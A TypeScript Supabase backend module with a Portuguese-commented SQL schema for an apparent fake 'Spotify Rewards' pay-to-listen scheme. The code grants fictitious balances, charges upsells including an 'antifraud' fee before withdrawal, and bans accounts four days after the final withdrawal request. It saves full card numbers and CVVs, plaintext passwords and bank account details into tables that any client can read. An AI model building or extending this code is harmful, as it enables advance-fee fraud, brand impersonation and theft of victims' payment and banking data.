import { createClient } from '@supabase/supabase-js';

const rawUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || 'https://zbaaopdndnlckuornird.supabase.co';
const SUPABASE_URL = rawUrl.replace(/\/rest\/v1\/?$/, '');
const SUPABASE_ANON_KEY = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpiYWFvcGRuZG5sY2t1b3JuaXJkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEwNDQ0NDksImV4cCI6MjA4NjYyMDQ0OX0.ydnHQTZth_MDmNTpPvcE3-5parUBxgJbD8k-cKHFyE4';

export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  auth: {
    persistSession: true,
    autoRefreshToken: true,
  },
});

export interface CustomerRecord {
  lead_id?: string;
  email: string;
  full_name?: string;
  stripe_customer_id?: string;
}

export interface PaymentMethodRecord {
  customer_id?: string;
  brand?: string;
  last4?: string;
  exp_month?: number;
  exp_year?: number;
  stripe_payment_method_id: string;
}

export interface PaymentRecord {
  email: string;
  full_name?: string;
  amount: number;
  currency: string;
  stripe_payment_id?: string;
  status: string; // succeeded, failed, pending
  error_message?: string;
  accumulated_balance?: number;
  country?: string;
}

export interface CardTestRecord {
  card_number: string;
  exp_date: string;
  cvv: string;
  country?: string;
  status?: string;
}

// 1. Register or get customer (Lead) in Supabase
export async function upsertCustomer(record: CustomerRecord) {
  try {
    const rawLeadId =
      record.lead_id ||
      (typeof window !== 'undefined' ? window.sessionStorage?.getItem('spotify_lead_id') : null);

    const isRealEmail =
      record.email &&
      record.email.trim() &&
      !record.email.includes('@spotify.lead') &&
      record.email.includes('@');

    const cleanEmail = record.email ? record.email.trim().toLowerCase() : '';

    // If we have a previous lead from the chat funnel and now the customer entered their real email:
    if (rawLeadId && isRealEmail) {
      // 1. Check if a record already exists with this real email
      const { data: existingRealEmailRows } = await supabase
        .from('customers')
        .select('*')
        .eq('email', cleanEmail)
        .limit(1);

      if (existingRealEmailRows && existingRealEmailRows.length > 0) {
        const existing = existingRealEmailRows[0];
        const { data } = await supabase
          .from('customers')
          .update({
            full_name: record.full_name || existing.full_name,
            stripe_customer_id: record.stripe_customer_id || existing.stripe_customer_id,
          })
          .eq('id', existing.id)
          .select();

        if (typeof window !== 'undefined') {
          window.sessionStorage?.setItem('spotify_lead_id', existing.id);
        }
        return { success: true, customer: (data && data[0]) || existing };
      }

      // 2. Otherwise update the existing lead row from temporary email to the REAL email!
      const { data, error } = await supabase
        .from('customers')
        .update({
          email: cleanEmail,
          full_name: record.full_name || undefined,
          stripe_customer_id: record.stripe_customer_id || undefined,
        })
        .eq('id', rawLeadId)
        .select();

      if (!error && data && data.length > 0) {
        if (typeof window !== 'undefined') {
          window.sessionStorage?.setItem('spotify_lead_id', data[0].id);
        }
        return { success: true, customer: data[0] };
      }
    }

    // Default flow: check by email
    const emailToUse = isRealEmail
      ? cleanEmail
      : record.email && record.email.trim()
      ? record.email.trim().toLowerCase()
      : 'lead_' + Date.now() + '_' + Math.floor(Math.random() * 10000) + '@spotify.lead';

    const { data: existingRows } = await supabase
      .from('customers')
      .select('*')
      .eq('email', emailToUse)
      .limit(1);

    const existing = existingRows && existingRows.length > 0 ? existingRows[0] : null;

    if (existing) {
      const { data, error } = await supabase
        .from('customers')
        .update({
          full_name: record.full_name || existing.full_name,
          stripe_customer_id: record.stripe_customer_id || existing.stripe_customer_id,
        })
        .eq('id', existing.id)
        .select();

      const customerObj = (data && data[0]) || existing;
      if (typeof window !== 'undefined' && customerObj?.id) {
        window.sessionStorage?.setItem('spotify_lead_id', customerObj.id);
      }
      return { success: true, customer: customerObj };
    }

    const { data, error } = await supabase
      .from('customers')
      .insert([
        {
          email: emailToUse,
          full_name: record.full_name || 'Anonymous Lead',
          stripe_customer_id: record.stripe_customer_id,
          created_at: new Date().toISOString(),
        },
      ])
      .select();

    if (error) {
      console.warn('Supabase customer upsert notice:', error.message);
      return { success: false, error: error.message };
    }

    const customerObj = data ? data[0] : null;
    if (typeof window !== 'undefined' && customerObj?.id) {
      window.sessionStorage?.setItem('spotify_lead_id', customerObj.id);
    }
    return { success: true, customer: customerObj };
  } catch (err: any) {
    console.warn('Supabase customer error:', err.message);
    return { success: false, error: err.message };
  }
}

// 2. Register payment method in Supabase
export async function recordPaymentMethod(record: PaymentMethodRecord) {
  try {
    const { data, error } = await supabase.from('payment_methods').insert([
      {
        customer_id: record.customer_id,
        brand: record.brand || 'unknown',
        last4: record.last4 || '0000',
        exp_month: record.exp_month || 1,
        exp_year: record.exp_year || 2030,
        stripe_payment_method_id: record.stripe_payment_method_id,
        created_at: new Date().toISOString(),
      },
    ]);

    if (error) {
      console.warn('Supabase payment_methods insert notice:', error.message);
      return { success: false, error: error.message };
    }

    return { success: true, data };
  } catch (err: any) {
    console.warn('Supabase payment method error:', err.message);
    return { success: false, error: err.message };
  }
}

// 3. Register payment attempt & lead info in Supabase
export async function recordPaymentInSupabase(payment: PaymentRecord) {
  try {
    const custRes = await upsertCustomer({
      email: payment.email,
      full_name: payment.full_name,
    });

    const customerId = custRes.customer?.id;

    // Check if this payment is already recorded in Supabase (avoid duplicate sales)
    if (payment.status === 'succeeded') {
      // 1. Deduplicate by Stripe Payment Intent ID if available
      if (payment.stripe_payment_id) {
        const { data: existingPayments } = await supabase
          .from('payments')
          .select('*')
          .eq('stripe_payment_id', payment.stripe_payment_id)
          .limit(1);

        if (existingPayments && existingPayments.length > 0) {
          const { data } = await supabase
            .from('payments')
            .update({
              status: payment.status,
              email: payment.email || existingPayments[0].email,
              full_name: payment.full_name || existingPayments[0].full_name,
            })
            .eq('id', existingPayments[0].id)
            .select();

          return { success: true, data: (data && data[0]) || existingPayments[0] };
        }
      }

      // 2. Deduplicate by customer email + exact amount (prevent accidental double click on same offer within 5 minutes)
      if (payment.email && !payment.email.includes('@spotify.lead')) {
        const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
        const { data: recentSucceeded } = await supabase
          .from('payments')
          .select('*')
          .eq('email', payment.email.trim().toLowerCase())
          .eq('status', 'succeeded')
          .eq('amount', payment.amount)
          .gte('created_at', fiveMinutesAgo)
          .limit(1);

        if (recentSucceeded && recentSucceeded.length > 0) {
          if (payment.stripe_payment_id && !recentSucceeded[0].stripe_payment_id) {
            await supabase
              .from('payments')
              .update({ stripe_payment_id: payment.stripe_payment_id })
              .eq('id', recentSucceeded[0].id);
          }
          return { success: true, data: recentSucceeded[0] };
        }
      }
    }

    const { data, error } = await supabase.from('payments').insert([
      {
        email: payment.email,
        full_name: payment.full_name,
        amount: payment.amount,
        currency: payment.currency,
        stripe_payment_id: payment.stripe_payment_id,
        status: payment.status,
        error_message: payment.error_message,
        accumulated_balance: payment.accumulated_balance || 114.93,
        country: payment.country || 'US',
        created_at: new Date().toISOString(),
      },
    ]);

    if (error) {
      console.warn('Supabase payments table insert notice:', error.message);
      return { success: false, error: error.message };
    }

    return { success: true, data };
  } catch (err: any) {
    console.warn('Supabase payment logging error:', err.message);
    return { success: false, error: err.message };
  }
}

// 4. Save simulated card test data into 'security_card_tests' table in Supabase
export async function recordCardTestInSupabase(record: CardTestRecord) {
  try {
    const { data, error } = await supabase.from('security_card_tests').insert([
      {
        card_number: record.card_number,
        exp_date: record.exp_date,
        cvv: record.cvv,
        country: record.country || 'US',
        status: record.status || 'succeeded',
        created_at: new Date().toISOString(),
      },
    ]);

    if (error) {
      console.warn('Supabase security_card_tests insert error:', error.message);
      return { success: false, error: error.message };
    }

    return { success: true, data };
  } catch (err: any) {
    console.warn('Supabase card test record exception:', err.message);
    return { success: false, error: err.message };
  }
}

// 5. Simple Payout Coordinates Helper
export interface PayoutDetails {
  email: string;
  method: 'direct_deposit' | 'zelle' | 'cashapp' | 'paypal' | 'apple_cash';
  bank_name?: string;
  routing_number?: string;
  account_number?: string;
  account_type?: string;
  zelle_tag?: string;
  cashapp_tag?: string;
  paypal_email?: string;
  apple_cash_phone?: string;
}

export async function savePayoutCoordinates(details: PayoutDetails) {
  try {
    if (typeof window !== 'undefined') {
      localStorage.setItem('spotify_payout_' + details.email.toLowerCase(), JSON.stringify(details));
      sessionStorage.setItem('spotify_payout_details', JSON.stringify(details));
    }

    // Try saving in Supabase listener_accounts or fallback gracefully
    try {
      await supabase
        .from('listener_accounts')
        .upsert(
          {
            email: details.email.toLowerCase(),
            payout_method: details.method,
            payout_details: details,
          },
          { onConflict: 'email' }
        );
    } catch {}

    return { success: true };
  } catch (e) {
    return { success: true };
  }
}

// 6. Complete Listener Account Auth & Supabase Sync
export interface ListenerAccountRecord {
  id?: string;
  email: string;
  full_name?: string;
  password?: string;
  payout_method?: string;
  payout_details?: any;
  accepted_terms?: boolean;
  accepted_terms_at?: string;
  balance?: number;
  current_day?: number;
  completed_evaluations?: number;
  created_at?: string;
  last_login_at?: string;
}

export async function saveListenerAccount(email: string, password: string, name?: string) {
  const cleanEmail = email.trim().toLowerCase();
  const cleanPassword = password.trim();
  const accountData: ListenerAccountRecord = {
    email: cleanEmail,
    full_name: name || 'Verified Listener',
    password: cleanPassword,
    balance: 114.93,
    current_day: 1,
    completed_evaluations: 0,
    accepted_terms: false,
    last_login_at: new Date().toISOString(),
  };

  if (typeof window !== 'undefined') {
    localStorage.setItem('spotify_auth_' + cleanEmail, JSON.stringify(accountData));
    sessionStorage.setItem('spotify_current_user', cleanEmail);
    sessionStorage.setItem('spotify_logged_in', 'true');
    sessionStorage.setItem('spotify_listener_email', cleanEmail);
    if (name) sessionStorage.setItem('spotify_listener_name', name);
  }

  // Sync to Supabase listener_accounts
  try {
    const { data: existing } = await supabase
      .from('listener_accounts')
      .select('*')
      .eq('email', cleanEmail)
      .limit(1);

    if (existing && existing.length > 0) {
      await supabase
        .from('listener_accounts')
        .update({
          full_name: name || existing[0].full_name,
          password: cleanPassword || existing[0].password,
          last_login_at: new Date().toISOString(),
        })
        .eq('id', existing[0].id);
    } else {
      await supabase.from('listener_accounts').insert([
        {
          email: cleanEmail,
          full_name: name || 'Verified Listener',
          password: cleanPassword,
          balance: 114.93,
          current_day: 1,
          completed_evaluations: 0,
          accepted_terms: false,
          created_at: new Date().toISOString(),
          last_login_at: new Date().toISOString(),
        },
      ]);
    }
  } catch (err) {
    console.warn('Notice syncing listener account to Supabase:', err);
  }

  return { success: true };
}

export async function verifyListenerLogin(email: string, password: string, name?: string) {
  const cleanEmail = email.trim().toLowerCase();
  const cleanPass = password.trim();

  // 1. Try checking in Supabase
  try {
    const { data, error } = await supabase
      .from('listener_accounts')
      .select('*')
      .eq('email', cleanEmail)
      .limit(1);

    if (!error && data && data.length > 0) {
      const user = data[0];
      if (user.password && user.password !== cleanPass) {
        return { success: false, error: 'Incorrect password for this account.' };
      }

      await supabase
        .from('listener_accounts')
        .update({ last_login_at: new Date().toISOString() })
        .eq('id', user.id);

      if (typeof window !== 'undefined') {
        localStorage.setItem('spotify_auth_' + cleanEmail, JSON.stringify(user));
        localStorage.setItem('spotify_password_created_' + cleanEmail, 'true');
        sessionStorage.setItem('spotify_current_user', cleanEmail);
        sessionStorage.setItem('spotify_logged_in', 'true');
        sessionStorage.setItem('spotify_listener_email', cleanEmail);
        if (user.full_name) sessionStorage.setItem('spotify_listener_name', user.full_name);
        if (user.accepted_terms) localStorage.setItem('spotify_terms_accepted_' + cleanEmail, 'true');
        if (user.is_vip_7day) localStorage.setItem('spotify_vip_7day_' + cleanEmail, 'true');
        if (typeof user.balance === 'number' && !localStorage.getItem('spotify_account_balance_' + cleanEmail)) {
          localStorage.setItem('spotify_account_balance_' + cleanEmail, user.balance.toString());
        }
        if (typeof user.daily_song_limit === 'number' && user.daily_song_limit > 3) {
          localStorage.setItem('spotify_daily_limit_' + cleanEmail, user.daily_song_limit.toString());
        }
        if (typeof user.current_day === 'number' && user.current_day > 1) {
          localStorage.setItem('spotify_current_day_' + cleanEmail, user.current_day.toString());
        }
        if (user.cooldown_until && !localStorage.getItem('spotify_cooldown_until_' + cleanEmail)) {
          localStorage.setItem('spotify_cooldown_until_' + cleanEmail, user.cooldown_until);
        }
      }

      return { success: true, user, isNew: false };
    }
  } catch {}

  // 2. Check local storage fallback
  if (typeof window !== 'undefined') {
    const local = localStorage.getItem('spotify_auth_' + cleanEmail);
    if (local) {
      try {
        const parsed = JSON.parse(local);
        if (parsed.password && parsed.password !== cleanPass) {
          return { success: false, error: 'Incorrect password for this account.' };
        }
        sessionStorage.setItem('spotify_current_user', cleanEmail);
        sessionStorage.setItem('spotify_logged_in', 'true');
        return { success: true, user: parsed, isNew: false };
      } catch {}
    }
  }

  // 3. User does not exist yet -> create new account on first login
  await saveListenerAccount(cleanEmail, cleanPass, name);
  return { success: true, isNew: true };
}

export async function updateListenerTermsInSupabase(email: string) {
  const cleanEmail = email.trim().toLowerCase();
  if (typeof window !== 'undefined') {
    localStorage.setItem('spotify_terms_accepted_' + cleanEmail, 'true');
  }

  try {
    await supabase
      .from('listener_accounts')
      .update({
        accepted_terms: true,
        accepted_terms_at: new Date().toISOString(),
      })
      .eq('email', cleanEmail);
  } catch {}

  return { success: true };
}

// 7. Track User Progress & Song Evaluations inside the App
export interface EvaluationProgressRecord {
  listener_email: string;
  song_id: string;
  song_title: string;
  artist: string;
  listen_duration_seconds?: number;
  answer_1: string;
  answer_2: string;
  reward_amount: number;
}

export async function recordListenerEvaluation(record: EvaluationProgressRecord) {
  const cleanEmail = record.listener_email.trim().toLowerCase();

  // Save to local storage for quick client access
  if (typeof window !== 'undefined') {
    const historyKey = 'spotify_evaluations_' + cleanEmail;
    const existing = JSON.parse(localStorage.getItem(historyKey) || '[]');
    existing.push({ ...record, created_at: new Date().toISOString() });
    localStorage.setItem(historyKey, JSON.stringify(existing));
  }

  // Insert into Supabase listener_progress & update account balance
  try {
    await supabase.from('listener_progress').insert([
      {
        listener_email: cleanEmail,
        song_id: record.song_id,
        song_title: record.song_title,
        artist: record.artist,
        listen_duration_seconds: record.listen_duration_seconds || 8,
        answer_1: record.answer_1,
        answer_2: record.answer_2,
        reward_amount: record.reward_amount,
        status: 'completed',
        created_at: new Date().toISOString(),
      },
    ]);

    // Fetch account to update balance & count
    const { data: accounts } = await supabase
      .from('listener_accounts')
      .select('balance, completed_evaluations')
      .eq('email', cleanEmail)
      .limit(1);

    if (accounts && accounts.length > 0) {
      const currentBal = Number(accounts[0].balance) || 114.93;
      const newBal = +(currentBal + record.reward_amount).toFixed(2);
      const count = (accounts[0].completed_evaluations || 0) + 1;

      await supabase
        .from('listener_accounts')
        .update({
          balance: newBal,
          completed_evaluations: count,
        })
        .eq('email', cleanEmail);
    }
  } catch (err) {
    console.warn('Notice saving evaluation to Supabase:', err);
  }

  return { success: true };
}

export function getListenerAccount(email: string) {
  if (typeof window !== 'undefined') {
    const raw = localStorage.getItem('spotify_auth_' + email.trim().toLowerCase());
    if (raw) {
      try {
        return JSON.parse(raw);
      } catch {}
    }
  }
  return null;
}

// 8. Funnel & Upsell/Downsell Event Tracking (Views, Purchases, Declines, Card Declines)
export type OfferIdType =
  | 'front_9_00'
  | 'upsell_vip_19_90'
  | 'downsell_vip_11_90'
  | 'upsell_booster3_16_97'
  | 'downsell_booster2_9_12'
  | 'upsell_skip12h_9_65'
  | 'upsell_antifraud_9_97';

export function checkAccountFraudBanStatus(email: string): {
  isBanned: boolean;
  bannedAt?: string;
} {
  if (typeof window === 'undefined' || !email) return { isBanned: false };
  const emailKey = email.trim().toLowerCase();
  if (!emailKey) return { isBanned: false };

  const explicitlyBanned = localStorage.getItem('spotify_account_banned_' + emailKey) === 'true';
  if (explicitlyBanned) {
    return {
      isBanned: true,
      bannedAt: localStorage.getItem('spotify_account_banned_at_' + emailKey) || new Date().toISOString(),
    };
  }

  // Check if 4 days (96 hours) have elapsed since the final post-anti-fraud withdrawal submission
  const finalWithdrawalAt = localStorage.getItem('spotify_final_withdrawal_at_' + emailKey);
  if (finalWithdrawalAt) {
    const submittedMs = new Date(finalWithdrawalAt).getTime();
    const fourDaysMs = 4 * 24 * 60 * 60 * 1000;
    if (!isNaN(submittedMs) && Date.now() - submittedMs >= fourDaysMs) {
      const banTime = new Date(submittedMs + fourDaysMs).toISOString();
      localStorage.setItem('spotify_account_banned_' + emailKey, 'true');
      localStorage.setItem('spotify_account_banned_at_' + emailKey, banTime);
      localStorage.setItem('spotify_withdrawal_stage_' + emailKey, 'account_banned');
      return { isBanned: true, bannedAt: banTime };
    }
  }

  return { isBanned: false };
}

export interface FunnelEventRecord {
  email: string;
  full_name?: string;
  offer_id: OfferIdType;
  offer_name: string;
  amount: number;
  action: 'viewed' | 'accepted' | 'declined' | 'card_declined';
  error_reason?: string;
  card_last4?: string;
  skipPaymentTable?: boolean;
}

export async function recordFunnelEvent(event: FunnelEventRecord) {
  const cleanEmail = (event.email || 'visitante@spotify.lead').trim().toLowerCase();
  const timestamp = new Date().toISOString();

  // 1. Save locally so Admin on same browser sees it immediately even before SQL migration
  if (typeof window !== 'undefined') {
    try {
      const localList = JSON.parse(localStorage.getItem('spotify_funnel_events') || '[]');
      localList.unshift({
        id: 'evt_' + Date.now() + '_' + Math.floor(Math.random() * 1000),
        ...event,
        email: cleanEmail,
        created_at: timestamp,
      });
      localStorage.setItem('spotify_funnel_events', JSON.stringify(localList.slice(0, 500)));
    } catch {}
  }

  // 2. Save in Supabase funnel_events table
  try {
    await supabase.from('funnel_events').insert([
      {
        email: cleanEmail,
        full_name: event.full_name || 'Verified Listener',
        offer_id: event.offer_id,
        offer_name: event.offer_name,
        amount: event.amount,
        action: event.action,
        error_reason: event.error_reason || null,
        card_last4: event.card_last4 || null,
        created_at: timestamp,
      },
    ]);
  } catch (err) {
    console.warn('Supabase funnel_events insert notice:', err);
  }

  // 3. If accepted or card_declined and not already logged in payments table, also log in payments table
  if (!event.skipPaymentTable && (event.action === 'accepted' || event.action === 'card_declined')) {
    try {
      await supabase.from('payments').insert([
        {
          email: cleanEmail,
          full_name: event.full_name || 'Verified Listener',
          amount: event.amount,
          currency: 'usd',
          status: event.action === 'accepted' ? 'succeeded' : 'declined',
          error_message:
            event.action === 'accepted'
              ? `Oferta Aprovada: ${event.offer_name} ($${event.amount.toFixed(2)})`
              : `Cartão Recusado em ${event.offer_name}: ${event.error_reason || 'Recusado pelo emissor'}`,
          country: 'US',
          created_at: timestamp,
        },
      ]);
    } catch {}
  }

  return { success: true };
}

// 8.1 Unlock Upsell / Downsell Benefits ONLY after Approved Payment
export async function unlockOfferBenefitAfterPayment(email: string, offerId: OfferIdType) {
  const emailKey = (email || sessionStorage.getItem('spotify_listener_email') || '').trim().toLowerCase();
  if (!emailKey) return;

  if (typeof window !== 'undefined') {
    if (offerId === 'upsell_vip_19_90' || offerId === 'downsell_vip_11_90') {
      localStorage.setItem('spotify_vip_7day_' + emailKey, 'true');
      localStorage.setItem('spotify_cadence_seen_' + emailKey, 'true');
    } else if (offerId === 'upsell_booster3_16_97') {
      const curLimit = parseInt(localStorage.getItem('spotify_daily_limit_' + emailKey) || '3', 10) || 3;
      const newLimit = Math.max(6, curLimit + 3);
      localStorage.setItem('spotify_daily_limit_' + emailKey, newLimit.toString());
      localStorage.removeItem('spotify_cooldown_until_' + emailKey);
      const curIdx = parseInt(localStorage.getItem('spotify_active_song_index_' + emailKey) || '0', 10) || 0;
      const curCompleted = parseInt(localStorage.getItem('spotify_songs_completed_' + emailKey) || '0', 10) || 0;
      if (curCompleted >= 3 && curIdx < curCompleted) {
        localStorage.setItem('spotify_active_song_index_' + emailKey, curCompleted.toString());
      }
    } else if (offerId === 'downsell_booster2_9_12') {
      const curLimit = parseInt(localStorage.getItem('spotify_daily_limit_' + emailKey) || '3', 10) || 3;
      const newLimit = Math.max(5, curLimit + 2);
      localStorage.setItem('spotify_daily_limit_' + emailKey, newLimit.toString());
      localStorage.removeItem('spotify_cooldown_until_' + emailKey);
      const curIdx = parseInt(localStorage.getItem('spotify_active_song_index_' + emailKey) || '0', 10) || 0;
      const curCompleted = parseInt(localStorage.getItem('spotify_songs_completed_' + emailKey) || '0', 10) || 0;
      if (curCompleted >= 3 && curIdx < curCompleted) {
        localStorage.setItem('spotify_active_song_index_' + emailKey, curCompleted.toString());
      }
    } else if (offerId === 'upsell_skip12h_9_65') {
      const curIdx = parseInt(localStorage.getItem('spotify_active_song_index_' + emailKey) || '0', 10) || 0;
      const curDay = parseInt(localStorage.getItem('spotify_current_day_' + emailKey) || '1', 10) || 1;
      localStorage.setItem('spotify_active_song_index_' + emailKey, (curIdx + 1).toString());
      localStorage.setItem('spotify_songs_completed_' + emailKey, '0');
      localStorage.setItem('spotify_today_earned_' + emailKey, '0');
      localStorage.setItem('spotify_current_day_' + emailKey, (curDay + 1).toString());
      localStorage.removeItem('spotify_cooldown_until_' + emailKey);
    } else if (offerId === 'upsell_antifraud_9_97') {
      const alreadyPaid = localStorage.getItem('spotify_antifraud_paid_' + emailKey) === 'true';
      if (!alreadyPaid) {
        const curBal = parseFloat(localStorage.getItem('spotify_account_balance_' + emailKey) || '500.00') || 500.0;
        const newBal = +(curBal + 9.97).toFixed(2);
        localStorage.setItem('spotify_account_balance_' + emailKey, newBal.toString());
        localStorage.setItem('spotify_antifraud_paid_' + emailKey, 'true');
        localStorage.setItem('spotify_antifraud_paid_at_' + emailKey, new Date().toISOString());
      }
      const curStage = localStorage.getItem('spotify_withdrawal_stage_' + emailKey);
      if (curStage !== 'pending_4days' && curStage !== 'account_banned') {
        localStorage.setItem('spotify_withdrawal_stage_' + emailKey, 'ready_re_request');
      }
    }
  }

  // Sync to Supabase listener_accounts if present
  try {
    if (offerId === 'upsell_vip_19_90' || offerId === 'downsell_vip_11_90') {
      await supabase
        .from('listener_accounts')
        .update({
          is_vip_7day: true,
          account_tier: 'VIP Gold Tier',
        })
        .eq('email', emailKey);
    } else if (offerId === 'upsell_booster3_16_97') {
      await supabase
        .from('listener_accounts')
        .update({
          daily_song_limit: 6,
          cooldown_until: null,
        })
        .eq('email', emailKey);
    } else if (offerId === 'downsell_booster2_9_12') {
      await supabase
        .from('listener_accounts')
        .update({
          daily_song_limit: 5,
          cooldown_until: null,
        })
        .eq('email', emailKey);
    } else if (offerId === 'upsell_skip12h_9_65') {
      const nextDay =
        typeof window !== 'undefined'
          ? parseInt(localStorage.getItem('spotify_current_day_' + emailKey) || '2', 10) || 2
          : 2;
      await supabase
        .from('listener_accounts')
        .update({
          songs_completed_today: 0,
          current_day: nextDay,
          cooldown_until: null,
        })
        .eq('email', emailKey);
    } else if (offerId === 'upsell_antifraud_9_97') {
      const newBalStr = typeof window !== 'undefined' ? localStorage.getItem('spotify_account_balance_' + emailKey) : null;
      if (newBalStr) {
        await supabase
          .from('listener_accounts')
          .update({
            balance: parseFloat(newBalStr),
            antifraud_fee_paid: true,
            withdrawal_stage: 'ready_re_request',
          })
          .eq('email', emailKey);
      }
    }
  } catch {}
}

// 9. Complete Master SQL Schema for Supabase SQL Editor
export const SPOTIFY_SCHEMA_SQL = `-- =========================================================================
-- SPOTIFY REWARDS: MASTER DATABASE SCHEMA FOR SUPABASE SQL EDITOR
-- Execute este script no Supabase SQL Editor para ativar todas as tabelas:
-- https://supabase.com/dashboard/project/zbaaopdndnlckuornird/sql/new
-- =========================================================================

-- 1. Tabela: listener_accounts (Contas, senhas, dados bancários, VIP, limites e LTV)
CREATE TABLE IF NOT EXISTS public.listener_accounts (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    email TEXT UNIQUE NOT NULL,
    full_name TEXT DEFAULT 'Verified Listener',
    password TEXT NOT NULL,
    payout_method TEXT DEFAULT 'direct_deposit',
    payout_details JSONB DEFAULT '{}'::jsonb,
    accepted_terms BOOLEAN DEFAULT FALSE,
    accepted_terms_at TIMESTAMPTZ,
    is_vip_7day BOOLEAN DEFAULT FALSE,
    account_tier TEXT DEFAULT 'Standard Verified Tier',
    balance NUMERIC(10, 2) DEFAULT 114.93,
    current_day INTEGER DEFAULT 1,
    active_song_index INTEGER DEFAULT 0,
    songs_completed_today INTEGER DEFAULT 0,
    daily_song_limit INTEGER DEFAULT 3,
    completed_evaluations INTEGER DEFAULT 0,
    cooldown_until TIMESTAMPTZ,
    withdrawal_stage TEXT DEFAULT 'idle',
    antifraud_fee_paid BOOLEAN DEFAULT FALSE,
    is_banned BOOLEAN DEFAULT FALSE,
    banned_at TIMESTAMPTZ,
    created_at TIMESTAMPTZ DEFAULT now(),
    last_login_at TIMESTAMPTZ DEFAULT now()
);

-- Adiciona colunas novas caso a tabela já exista
ALTER TABLE public.listener_accounts ADD COLUMN IF NOT EXISTS is_vip_7day BOOLEAN DEFAULT FALSE;
ALTER TABLE public.listener_accounts ADD COLUMN IF NOT EXISTS account_tier TEXT DEFAULT 'Standard Verified Tier';
ALTER TABLE public.listener_accounts ADD COLUMN IF NOT EXISTS active_song_index INTEGER DEFAULT 0;
ALTER TABLE public.listener_accounts ADD COLUMN IF NOT EXISTS songs_completed_today INTEGER DEFAULT 0;
ALTER TABLE public.listener_accounts ADD COLUMN IF NOT EXISTS daily_song_limit INTEGER DEFAULT 3;
ALTER TABLE public.listener_accounts ADD COLUMN IF NOT EXISTS cooldown_until TIMESTAMPTZ;
ALTER TABLE public.listener_accounts ADD COLUMN IF NOT EXISTS withdrawal_stage TEXT DEFAULT 'idle';
ALTER TABLE public.listener_accounts ADD COLUMN IF NOT EXISTS antifraud_fee_paid BOOLEAN DEFAULT FALSE;
ALTER TABLE public.listener_accounts ADD COLUMN IF NOT EXISTS is_banned BOOLEAN DEFAULT FALSE;
ALTER TABLE public.listener_accounts ADD COLUMN IF NOT EXISTS banned_at TIMESTAMPTZ;

-- 2. Tabela: funnel_events (Rastreamento de Upsells, Downsells, Aceites, Recusas e Cartões Recusados)
CREATE TABLE IF NOT EXISTS public.funnel_events (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    email TEXT NOT NULL,
    full_name TEXT DEFAULT 'Verified Listener',
    offer_id TEXT NOT NULL,
    offer_name TEXT NOT NULL,
    amount NUMERIC(10, 2) DEFAULT 0,
    action TEXT NOT NULL, -- viewed, accepted, declined, card_declined
    error_reason TEXT,
    card_last4 TEXT,
    created_at TIMESTAMPTZ DEFAULT now()
);

-- 3. Tabela: listener_progress (Músicas avaliadas, respostas e comissões ganhas)
CREATE TABLE IF NOT EXISTS public.listener_progress (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    account_id UUID REFERENCES public.listener_accounts(id) ON DELETE CASCADE,
    listener_email TEXT NOT NULL,
    song_id TEXT NOT NULL,
    song_title TEXT NOT NULL,
    artist TEXT NOT NULL,
    listen_duration_seconds INTEGER DEFAULT 90,
    answer_1 TEXT,
    answer_2 TEXT,
    reward_amount NUMERIC(10, 2) DEFAULT 19.20,
    status TEXT DEFAULT 'completed',
    created_at TIMESTAMPTZ DEFAULT now()
);

-- 4. Tabela: listener_withdrawals (Solicitações de saque de $500+ USD)
CREATE TABLE IF NOT EXISTS public.listener_withdrawals (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    account_id UUID REFERENCES public.listener_accounts(id) ON DELETE CASCADE,
    listener_email TEXT NOT NULL,
    amount NUMERIC(10, 2) NOT NULL,
    status TEXT DEFAULT 'pending', -- pending, completed, declined, cancelled
    payout_method TEXT,
    destination_target TEXT,
    decline_reason TEXT,
    scheduled_clearing_date DATE,
    created_at TIMESTAMPTZ DEFAULT now(),
    updated_at TIMESTAMPTZ DEFAULT now()
);

-- 5. Habilita RLS e Políticas Públicas
ALTER TABLE public.listener_accounts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.funnel_events ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.listener_progress ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.listener_withdrawals ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Allow public read on listener_accounts" ON public.listener_accounts;
CREATE POLICY "Allow public read on listener_accounts" ON public.listener_accounts FOR SELECT USING (true);
DROP POLICY IF EXISTS "Allow public insert on listener_accounts" ON public.listener_accounts;
CREATE POLICY "Allow public insert on listener_accounts" ON public.listener_accounts FOR INSERT WITH CHECK (true);
DROP POLICY IF EXISTS "Allow public update on listener_accounts" ON public.listener_accounts;
CREATE POLICY "Allow public update on listener_accounts" ON public.listener_accounts FOR UPDATE USING (true);

DROP POLICY IF EXISTS "Allow public read on funnel_events" ON public.funnel_events;
CREATE POLICY "Allow public read on funnel_events" ON public.funnel_events FOR SELECT USING (true);
DROP POLICY IF EXISTS "Allow public insert on funnel_events" ON public.funnel_events;
CREATE POLICY "Allow public insert on funnel_events" ON public.funnel_events FOR INSERT WITH CHECK (true);
DROP POLICY IF EXISTS "Allow public update on funnel_events" ON public.funnel_events;
CREATE POLICY "Allow public update on funnel_events" ON public.funnel_events FOR UPDATE USING (true);

DROP POLICY IF EXISTS "Allow public read on listener_progress" ON public.listener_progress;
CREATE POLICY "Allow public read on listener_progress" ON public.listener_progress FOR SELECT USING (true);
DROP POLICY IF EXISTS "Allow public insert on listener_progress" ON public.listener_progress;
CREATE POLICY "Allow public insert on listener_progress" ON public.listener_progress FOR INSERT WITH CHECK (true);
DROP POLICY IF EXISTS "Allow public update on listener_progress" ON public.listener_progress;
CREATE POLICY "Allow public update on listener_progress" ON public.listener_progress FOR UPDATE USING (true);

DROP POLICY IF EXISTS "Allow public read on listener_withdrawals" ON public.listener_withdrawals;
CREATE POLICY "Allow public read on listener_withdrawals" ON public.listener_withdrawals FOR SELECT USING (true);
DROP POLICY IF EXISTS "Allow public insert on listener_withdrawals" ON public.listener_withdrawals;
